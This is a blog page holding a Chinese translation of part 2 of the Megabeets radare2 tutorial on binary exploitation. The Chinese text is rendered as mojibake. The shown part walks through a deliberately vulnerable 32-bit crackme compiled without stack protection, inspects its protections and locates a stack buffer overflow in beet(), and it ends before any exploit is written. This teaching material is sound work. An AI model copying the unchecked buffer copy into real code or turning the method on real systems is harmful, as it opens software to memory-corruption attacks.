<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  
  <title>ã€è¯‘ã€‘Radare2ä¹‹æ—…-Part2ï¼šExploitation | AssassinQ</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="keywords" content="retranslation">
  
  
  
  
  <meta name="description" content="ç¿»è¯‘è‡ªMegabeetsã€‚">
<meta name="keywords" content="re,translation">
<meta property="og:type" content="article">
<meta property="og:title" content="ã€è¯‘ã€‘Radare2ä¹‹æ—…-Part2ï¼šExploitation">
<meta property="og:url" content="https://qianfei11.github.io/2019/02/23/ã€è¯‘ã€‘Radare2ä¹‹æ—…-Part2ï¼šExploitation/index.html">
<meta property="og:site_name" content="AssassinQ">
<meta property="og:description" content="ç¿»è¯‘è‡ªMegabeetsã€‚">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://www.megabeets.net/uploads/r2_part1_2.png">
<meta property="og:image" content="https://www.megabeets.net/uploads/mainsym.png">
<meta property="og:image" content="https://www.megabeets.net/uploads/beetsym.png">
<meta property="og:image" content="https://www.megabeets.net/uploads/tumblr_m5vxpy8Cs41qfoh4t.gif">
<meta property="og:updated_time" content="2019-02-28T05:32:09.034Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ã€è¯‘ã€‘Radare2ä¹‹æ—…-Part2ï¼šExploitation">
<meta name="twitter:description" content="ç¿»è¯‘è‡ªMegabeetsã€‚">
<meta name="twitter:image" content="https://www.megabeets.net/uploads/r2_part1_2.png">
  
    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
  
  <link rel="icon" href="/css/images/favicon.ico">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
    
  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">

  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css">
  <link rel="stylesheet" href="/css/fashion.css">
  <link rel="stylesheet" href="/css/glyphs.css">

</head>
</html>


  <body data-spy="scroll" data-target="#toc" data-offset="50">


  
  
  <div class="site-header-image">
    <img id="originBg" width="100%" alt="Hike News" src>
  </div>

  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
  </div>

  <script>
        var imgUrls = "css/images/pose01.jpg".split(",");
        var random = Math.floor((Math.random() * imgUrls.length ));
        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
          document.getElementById("originBg").src=imgUrls[random];
          document.getElementById("blurBg").src=imgUrls[random];
        } else {
          document.getElementById("originBg").src='/' + imgUrls[random];
          document.getElementById("blurBg").src='/' + imgUrls[random];
        }
    </script>




<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
  <div class="clearfix container">
      <div class="site-branding">

          <h1 class="site-title">
            
              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
            
          </h1>
          
          
            <div class="site-description">ZJGSU-IS-17</div>
          
            
          <nav id="main-navigation" class="main-navigation" role="navigation">
            <a class="nav-open">Menu</a>
            <a class="nav-close">Close</a>

            <div class="clearfix sf-menu">
              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
                    
              </ul>
            </div>
          </nav>

      </div>
  </div>
</header>


  <div id="container">
    <div id="wrap">
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-ã€è¯‘ã€‘Radare2ä¹‹æ—…-Part2ï¼šExploitation" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      ã€è¯‘ã€‘Radare2ä¹‹æ—…-Part2ï¼šExploitation
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2019/02/23/ã€è¯‘ã€‘Radare2ä¹‹æ—…-Part2ï¼šExploitation/" class="article-date">
	  <time datetime="2019-02-23T03:18:10.000Z" itemprop="datePublished">February 23, 2019</time>
	</a>

       
      

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>ç¿»è¯‘è‡ª<a href="https://www.megabeets.net/a-journey-into-radare-2-part-2/" target="_blank" rel="noopener">Megabeets</a>ã€‚</p>
<a id="more"></a>
<h1 id="åºè¨€"><a href="#åºè¨€" class="headerlink" title="åºè¨€"></a>åºè¨€</h1><p>æ¬¢è¿æ¥åˆ°æˆ‘ä»¬<code>radare2</code>ä¹‹æ—…çš„ç¬¬äºŒéƒ¨åˆ†ï¼åœ¨è¿™ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬ä¼šæ¶µç›–<code>radare2</code>çš„æ›´å¤šéƒ¨åˆ†ï¼ŒåŒæ—¶è¿™æ¬¡æ›´æ³¨é‡äºäºŒè¿›åˆ¶æ¼æ´æŒ–æ˜ã€‚</p>
<p>ç›¸ä¿¡å¤§å®¶éƒ½ä¸€å®šå¾ˆæœŸå¾…è¿™ç¬¬äºŒéƒ¨åˆ†ï¼Œä¹‹åçš„å†…å®¹ä¹Ÿä¸€å®šä¼šæ›´å¿«åœ°åˆ†äº«ç»™å¤§å®¶ã€‚å¦‚æœä½ è¿˜æ²¡æœ‰é˜…è¯»è¿‡è¿™ä¸€ç³»åˆ—çš„<a href="https://www.megabeets.net/a-journey-into-radare-2-part-1/" target="_blank" rel="noopener">ç¬¬ä¸€éƒ¨åˆ†</a>ï¼Œæˆ‘éå¸¸æ¨èä½ å»è¯»ä¸€è¯»ã€‚ç¬¬ä¸€éƒ¨åˆ†è®°å½•äº†<code>radare2</code>çš„åŸºç¡€å†…å®¹ï¼ŒåŒæ—¶ä¹Ÿè§£é‡Šäº†å¾ˆå¤šæˆ‘ä»Šå¤©ä¼šç”¨åˆ°çš„å‘½ä»¤ã€‚</p>
<p>åœ¨è¿™ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯å¯¹ä¸€ä¸ªç®€å•çš„ç¨‹åºè¿›è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨ã€‚<code>radare2</code>æœ‰å¾ˆå¤šä¸åŒçš„åŠŸèƒ½å¯ä»¥å¸®æˆ‘ä»¬å¯¹æ¼æ´è¿›è¡Œåˆ©ç”¨ï¼Œä¾‹å¦‚ä¿æŠ¤æŠ€æœ¯ã€æŸ¥æ‰¾ROPã€ç”Ÿæˆéšæœºåºåˆ—ã€æŸ¥çœ‹å¯„å­˜å™¨å†…å®¹ç­‰ç­‰ã€‚ä½ å¯ä»¥åœ¨æœ¬æ–‡æœ«å°¾æ‰¾åˆ°ä¸€ä»½å‘½ä»¤å¯¹åº”è¡¨ã€‚ä»Šå¤©æˆ‘ä¼šå‘ä½ ä»¬å±•ç¤ºè¿™äº›å¼ºå¤§çš„åŠŸèƒ½ï¼ŒåŒæ—¶æˆ‘ä»¬ç”¨<code>radare2</code>æ¥ç»•è¿‡åœ¨å¼€å¯<code>ASLR</code>çš„ç³»ç»Ÿä¸Šè¿è¡Œå¹¶ä¸”æœ‰<code>NX</code>ä¿æŠ¤çš„ç¨‹åºã€‚æˆ‘å‡è®¾å¤§å®¶éƒ½å·²ç»æŒæ¡äº†ä»¥ä¸‹çš„é¢„å¤‡çŸ¥è¯†ï¼š</p>
<ul>
<li>æ±‡ç¼–è¯­è¨€</li>
<li>ç¨‹åºä¿æŠ¤æŠ€æœ¯ï¼ˆ<code>NX</code>ã€<code>ASLR</code>ï¼‰</li>
<li><a href="https://en.wikipedia.org/wiki/Call_stack" target="_blank" rel="noopener">æ ˆå¸§ç»“æ„</a></li>
<li><a href="https://en.wikipedia.org/wiki/Buffer_overflow" target="_blank" rel="noopener">ç¼“å†²åŒºæº¢å‡º</a></li>
<li><a href="https://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank" rel="noopener">é¢å‘è¿”å›ç¼–ç¨‹</a></li>
<li><a href="https://en.wikipedia.org/wiki/X86_calling_conventions" target="_blank" rel="noopener">x86è°ƒç”¨çº¦å®š</a></li>
</ul>
<p>ç†Ÿæ‚‰è¿™äº›çŸ¥è¯†æ˜¯å¾ˆé‡è¦çš„ä¸€æ­¥ï¼Œå› ä¸ºæ–‡ç« ä¸­æˆ‘å¹¶ä¸ä¼šç»†è®²ï¼Œç”šè‡³ä¸ä¼šå¯¹å…¶è§£é‡Šã€‚</p>
<p><img src="https://www.megabeets.net/uploads/r2_part1_2.png" alt></p>
<h1 id="æ›´æ–°radare2"><a href="#æ›´æ–°radare2" class="headerlink" title="æ›´æ–°radare2"></a>æ›´æ–°<code>radare2</code></h1><p>é¦–å…ˆï¼Œæˆ‘ä»¬å°†<code>radare2</code>æ›´æ–°è‡³å…¶gitçš„æœ€æ–°ç‰ˆç‰ˆï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/radare/radare2.git <span class="comment"># å¦‚æœä½ è¿˜æ²¡æœ‰å…‹éš†ä¸‹æ¥çš„è¯</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> radare2</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./sys/install.sh</span></span><br></pre></td></tr></table></figure>
<p>ç­‰å¾…æ›´æ–°å®Œæˆéœ€è¦å¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œåœ¨è¿™æœŸé—´ä¸å¦‚çœ‹äº›è§†é¢‘æ”¾æ¾ä¸€ä¼šå„¿ã€‚</p>
<h1 id="ç†Ÿæ‚‰ç¨‹åº"><a href="#ç†Ÿæ‚‰ç¨‹åº" class="headerlink" title="ç†Ÿæ‚‰ç¨‹åº"></a>ç†Ÿæ‚‰ç¨‹åº</h1><p>ä½ å¯ä»¥åœ¨è¿™é‡Œä¸‹è½½<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%202%20-%20Exploitation/megabeets_0x2" target="_blank" rel="noopener">ç¨‹åº</a>ï¼Œåœ¨è¿™é‡Œä¸‹è½½<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%202%20-%20Exploitation/megabeets_0x2.c" target="_blank" rel="noopener">æºç </a>ã€‚<br>å¦‚æœä½ æƒ³è‡ªå·±ç¼–è¯‘ç¨‹åºï¼Œç”¨ä»¥ä¸‹å‘½ä»¤ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc -m32  -fno-stack-protector megabeets_0x2.c -o megabeets_0x2</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡çš„ç¨‹åºä¸ä¸Šä¸€æ¬¡çš„ç¨‹åºéå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯åœ¨<code>main()</code>å‡½æ•°ä¸­æœ‰ä¸€äº›ç»†å¾®çš„æ”¹å˜ï¼š</p>
<ul>
<li>ç¼–è¯‘æ—¶ä¸ä½¿ç”¨å‚æ•°<code>-z execstac</code>æ¥å¼€å¯<code>NX</code></li>
<li>é€šè¿‡scanfæ¥æ¥æ”¶ç”¨æˆ·çš„è¾“å…¥ï¼Œè€Œä¸æ˜¯é€šè¿‡ç¨‹åºçš„å‚æ•°</li>
<li>å¤§éƒ¨åˆ†è¾“å‡ºçš„å‡½æ•°ä¸ºputs</li>
<li>å¯¹ç¨‹åºçš„è¾“å‡ºåšäº†ä¸€ç‚¹ä¿®æ”¹</li>
</ul>
<p>è¿™æ˜¯ä¹‹å‰çš„<code>main()</code>å‡½æ•°ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n  .:: Megabeets ::.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Think you can make it?\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (argc &gt;= <span class="number">2</span> &amp;&amp; beet(argv[<span class="number">1</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Success!\n\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Nop, Wrong argument.\n\n"</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç„¶åç°åœ¨çš„<code>main</code>å‡½æ•°æ˜¯è¿™æ ·çš„ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *input; </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\n  .:: Megabeets ::.\n"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Show me what you got:"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%ms"</span>, &amp;input);</span><br><span class="line">    <span class="keyword">if</span> (beet(input))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Success!\n\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Nop, Wrong argument.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç¨‹åºçš„åŠŸèƒ½ååˆ†ç®€å•ï¼Œå¹¶ä¸”åœ¨å‰ä¸€ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬å·²ç»å¯¹å®ƒå¾ˆç†Ÿæ‚‰äº†â€”â€”è¦æ±‚è¾“å…¥å­—ç¬¦ä¸²ï¼Œä¸ç»è¿‡<code>rot13</code>åŠ å¯†çš„å­—ç¬¦ä¸²<code>Megabeets</code>æ¯”è¾ƒã€‚æ•…è¾“å…¥åº”è¯¥ä¸º<code>Zrtnorrgf</code>ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./megabeets_0x2 </span></span><br><span class="line"></span><br><span class="line">  .:: Megabeets ::.</span><br><span class="line"></span><br><span class="line">Show me what you got:</span><br><span class="line">blablablabla</span><br><span class="line">Nop, Wrong argument.</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./megabeets_0x2 </span></span><br><span class="line"></span><br><span class="line">  .:: Megabeets ::.</span><br><span class="line"></span><br><span class="line">Show me what you got:</span><br><span class="line">Zrtnorrgf</span><br><span class="line">Success!</span><br></pre></td></tr></table></figure>
<p>è¿™äº›éƒ½å¾ˆç®€å•ï¼Œä½†æ˜¯æˆ‘ä»¬ä»Šå¤©çš„é‡ç‚¹å¹¶ä¸æ˜¯ç ´è§£ä¸€ä¸ªç®€å•çš„crackmeï¼Œè€Œæ˜¯å¯¹å…¶è¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚é‚£æˆ‘ä»¬å¼€å§‹å§ï¼</p>
<h1 id="ç†è§£æ¼æ´"><a href="#ç†è§£æ¼æ´" class="headerlink" title="ç†è§£æ¼æ´"></a>ç†è§£æ¼æ´</h1><p>å¯¹äºæ¯ä¸€ä¸ªPWNé¢˜ç»™å‡ºçš„ç¨‹åºæ¥è¯´ï¼Œæ£€æŸ¥ç¨‹åºå¼€äº†ä»€ä¹ˆä¿æŠ¤æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­æåˆ°çš„<code>rabin2</code>ï¼Œæˆ–è€…ç›´æ¥åœ¨<code>radare2</code>çš„shellé‡Œæ‰§è¡Œ<code>i</code>å‘½ä»¤ã€‚å› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰ç”¨<code>radare2</code>æ‰“å¼€æ–‡ä»¶ï¼Œå°±å…ˆç”¨<code>rabin2</code>æ¥çœ‹çœ‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> rabin2 -I megabeets_0x2</span></span><br><span class="line"> </span><br><span class="line">arch     x86</span><br><span class="line">binsz    6072</span><br><span class="line">bintype  elf</span><br><span class="line">bits     32</span><br><span class="line">canary   false</span><br><span class="line">class    ELF32</span><br><span class="line">crypto   false</span><br><span class="line">endian   little</span><br><span class="line">havecode true</span><br><span class="line">intrp    /lib/ld-linux.so.2</span><br><span class="line">lang     c</span><br><span class="line">linenum  true</span><br><span class="line">lsyms    true</span><br><span class="line">machine  Intel 80386</span><br><span class="line">maxopsz  16</span><br><span class="line">minopsz  1</span><br><span class="line">nx       true</span><br><span class="line">os       linux</span><br><span class="line">pcalign  0</span><br><span class="line">pic      false</span><br><span class="line">relocs   true</span><br><span class="line">relro    partial</span><br><span class="line">rpath    NONE</span><br><span class="line">static   false</span><br><span class="line">stripped false</span><br><span class="line">subsys   linux</span><br><span class="line">va       true</span><br></pre></td></tr></table></figure>
<p>åœ¨æ ‡è®°çš„å‡ è¡Œä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¨‹åºå¼€äº†<code>NX</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æ ˆæ˜¯ä¸å¯æ‰§è¡Œçš„ã€‚è¿˜æœ‰ï¼Œè¯¥ç¨‹åºæ²¡æœ‰å¼€å¯<a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries" target="_blank" rel="noopener"><code>Canary</code></a>ã€<a href="https://en.wikipedia.org/wiki/Position-independent_code" target="_blank" rel="noopener"><code>PIC</code></a>æˆ–æ˜¯<a href="https://tk-blog.blogspot.co.il/2009/02/relro-not-so-well-known-memory.html" target="_blank" rel="noopener"><code>RELRO</code></a>ã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬è¿…é€Ÿåœ°è¿‡ä¸€éç¨‹åºçš„æ‰§è¡Œæµï¼Œè¿™æ¬¡æˆ‘ä»¬çœ‹ä¸€çœ‹å®ƒçš„åæ±‡ç¼–ä»£ç ï¼ˆå¹¶ä¸æ˜¯æ¯æ¬¡æ¼æ´æŒ–æ˜éƒ½èƒ½æœ‰æºç ï¼‰ã€‚ä½¿ç”¨<code>radare2</code>çš„è°ƒè¯•æ¨¡å¼æ‰“å¼€ç¨‹åºï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> r2 -d megabeets_0x2</span></span><br><span class="line">Process with PID 20859 startedâ€¦</span><br><span class="line">= attach 20859 20859</span><br><span class="line">bin.baddr 0x08048000</span><br><span class="line">Using 0x8048000</span><br><span class="line">Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2</span><br><span class="line">asm.bits 32â€“ Your endian swaps</span><br><span class="line"><span class="meta">[0xf7782b30]&gt;</span><span class="bash"> aas</span></span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li><code>-d</code>  â€“ ç”¨è°ƒè¯•æ¨¡å¼æ‰“å¼€</li>
<li><code>aas</code> â€“ åˆ†æå‡½æ•°ã€ç¬¦å·ä»¥åŠå…¶ä»–</li>
<li>æ³¨æ„ï¼šæ­£å¦‚æˆ‘åœ¨å‰ä¸€ç¯‡æ–‡ç« æ‰€æåˆ°çš„ï¼Œå¼€å§‹æ—¶ä½¿ç”¨<code>aaa</code>åˆ†ææ˜¯æœ€æ¨èçš„æ–¹å¼ï¼Œå› ä¸ºåˆ†ææœ¬æ¥å°±æ˜¯ä¸€ä¸ªå¾ˆå¤æ‚çš„è¿‡ç¨‹ã€‚æˆ‘åœ¨<a href="https://reverseengineering.stackexchange.com/a/16115/18698" target="_blank" rel="noopener">è¿™ç¯‡å›ç­”</a>é‡Œå†™äº†æ›´å¤šâ€”â€”è¯»ä¸€ä¸‹ä¹Ÿè®¸ä¼šè®©ä½ çš„ç†è§£æ›´æ·±ã€‚</li>
</ul>
</blockquote>
<p>ç°åœ¨æˆ‘ä»¬ç»§ç»­æ‰§è¡Œç¨‹åºï¼Œç›´åˆ°<code>main</code>å‡½æ•°ã€‚åªè¦è¾“å…¥å‘½ä»¤<code>dcu main</code>ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[0xf7797b30]&gt;</span><span class="bash"> dcu?</span></span><br><span class="line">|Usage: dcu Continue until address</span><br><span class="line">| dcu address      Continue until address</span><br><span class="line">| dcu [..tail]     Continue until the range</span><br><span class="line">| dcu [from] [to]  Continue until the range</span><br><span class="line"><span class="meta">[0xf7797b30]&gt;</span><span class="bash"> dcu main</span></span><br><span class="line">Continue until 0x08048658 using 1 bpsize</span><br><span class="line">hit breakpoint at: 8048658</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li><code>dcu</code>ä»£è¡¨<code>debug continue until</code></li>
</ul>
</blockquote>
<p>ç°åœ¨è®©æˆ‘ä»¬è¾“å…¥<code>VV</code>è¿›å…¥å›¾å½¢æ¨¡å¼ã€‚åœ¨ç¬¬ä¸€éƒ¨åˆ†è§£é‡Šè¿‡ï¼Œä½ å¯ä»¥é€šè¿‡<code>p</code>å’Œ<code>P</code>åˆ‡æ¢è§†è§’ï¼Œé€šè¿‡<code>k</code>/<code>j</code>/<code>h</code>/<code>l</code>åˆ†åˆ«å‘ä¸Š/ä¸‹/å·¦/å³ç§»åŠ¨ï¼Œé€šè¿‡<code>g</code>å’Œè°ƒç”¨æ—çš„å­—æ¯è·³è½¬å‡½æ•°ï¼ˆä¾‹å¦‚<code>gd</code>ï¼‰ã€‚</p>
<p>ç”¨<code>?</code>æ¥åˆ—å‡ºæ‰€æœ‰åœ¨å›¾å½¢æ¨¡å¼ä¸‹çš„å‘½ä»¤ï¼ŒåŒæ—¶åˆ«å¿˜è®°<code>R</code>å‘½ä»¤ğŸ˜‰</p>
<p><img src="https://www.megabeets.net/uploads/mainsym.png" alt></p>
<p><code>main()</code>å‡½æ•°æ˜¯ç¨‹åºè¦æ±‚æˆ‘ä»¬è¾“å…¥çš„åœ°æ–¹ï¼Œå¹¶ä¸”å®ƒå°†è¾“å…¥ä¼ ç»™<code>sym.beet</code>ã€‚é€šè¿‡<code>gc</code>æˆ‘ä»¬è·³è½¬åˆ°å¤„ç†æˆ‘ä»¬è¾“å…¥çš„<code>beet()</code>å‡½æ•°ï¼š</p>
<p><img src="https://www.megabeets.net/uploads/beetsym.png" alt></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç”¨æˆ·çš„è¾“å…¥<code>[arg_8h]</code>è¢«å¤åˆ¶ç»™ä¸€ä¸ªç¼“å†²åŒºï¼ˆ<code>[local_88h]</code>ï¼‰ï¼Œç„¶åå°±æ˜¯æˆ‘ä»¬åœ¨å‰ä¸€ç¯‡æ–‡ç« ä¸­æ‰€çœ‹åˆ°è¿‡çš„ï¼Œå­—ç¬¦ä¸²<code>Megabeets</code>ç”¨<code>rot13</code>åŠ å¯†äº†ï¼Œæ‰€å¾—ç»“æœä¸æˆ‘ä»¬çš„è¾“å…¥åšæ¯”è¾ƒã€‚æˆ‘ä»¬ä¹‹å‰äº†è§£è¿‡ï¼Œæˆ‘è¿™é‡Œå°±ä¸åšæ·±ç©¶ã€‚</p>
<p>ä½ æœ‰çœ‹åˆ°ä»€ä¹ˆå¯ä»¥çš„åœ°æ–¹å—ï¼Ÿæˆ‘ä»¬çš„è¾“å…¥æ²¡æœ‰å¯¹é•¿åº¦åšæ£€æŸ¥ï¼Œç„¶åç›´æ¥å¤åˆ¶åˆ°äº†ç¼“å†²åŒºä¸­ã€‚è¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬è¾“å…¥ä¸€ä¸²è¶…è¿‡ç¼“å†²åŒºå¤§å°çš„å­—ç¬¦ä¸²ï¼Œå°±èƒ½å¯¼è‡´æ ˆä¸Šçš„ç¼“å†²åŒºæº¢å‡ºã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†æ¼æ´ã€‚</p>
